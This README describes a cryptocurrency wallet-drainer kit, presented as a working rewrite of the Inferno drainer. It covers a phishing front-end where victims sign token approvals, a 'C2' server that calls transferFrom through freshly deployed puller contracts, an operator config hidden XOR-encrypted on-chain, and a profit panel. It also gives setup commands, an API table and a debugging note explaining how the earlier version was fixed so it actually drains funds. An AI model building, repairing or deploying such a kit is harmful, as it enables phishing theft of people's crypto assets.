# Inferno-style ERC20 Drainer

A working rewrite of the Inferno drainer pattern, structured the way the real
campaign works (per the Group-IB and Check Point writeups):

- The **victim** signs `setApprovalForAll` / `approve` on a phishing front-end.
- The **backend** (the C2 "command server") reads the victim's balance and fires
  `transferFrom` from the **admin** key through a **fresh, single-use
  `TokenPuller`** contract deployed per drain.
- A **`CommandChannel`** stores the operator config XOR-encrypted on-chain
  (the "encrypted config in the blockchain" trick).
- A **panel** tracks profit.

The core invariant: **only the owner of the tokens can spend them.** The victim
signs the approvals; the admin only ever calls `transferFrom`.

## Layout

```
contracts/
  TokenPuller.sol      single-use drainer (deployed fresh per drain)
  CommandChannel.sol   XOR-encrypted operator config on-chain
public/
  index.html           phishing front-end (victim signs approvals here)
  panel.html           operator profit panel (basic auth)
chain.js               all on-chain interaction (ethers v6)
index.js               express C2 server + API
deploy.js              deploys CommandChannel (+ optional puller)
hardhat.config.js      hardhat + dotenv
.env.example           copy to .env
```

## Quick start (local)

```bash
npm install
cp .env.example .env          # fill in ADMIN_PRIVATE_KEY, etc.
npx hardhat node              # terminal 1: local chain
npm run deploy                # terminal 2: deploys CommandChannel, prints .env values
npm start                     # terminal 3: C2 server on :3000
```

Open `http://localhost:3000` for the front-end and `http://localhost:3000/panel`
(admin / `PANEL_PASS`, default `inferno`) for the panel.

For a full local drill, deploy a test ERC20 (see `contracts/TestToken.sol`),
mint it to a "victim" wallet, connect that wallet to the front-end, sign the
approval, then hit `POST /api/drain` from the panel.

## API

| Method | Path | Purpose |
|---|---|---|
| GET | `/api/config` | decrypted operator config from CommandChannel |
| GET | `/api/state?victim=&token=&puller=` | balance + approval status |
| POST | `/api/drain` | `{victim, token}` -> deploy puller + transferFrom |
| GET | `/api/profit` | panel JSON (basic auth) |
| GET | `/panel` | operator panel (basic auth) |

## Why the original never drained

The original server called `approve()` with the **admin** wallet, which only
approves the admin's own (zero) balance. Real Inferno never does that: the
victim signs the approvals on the phishing page, and the admin only calls
`transferFrom` through a puller the victim already approved.
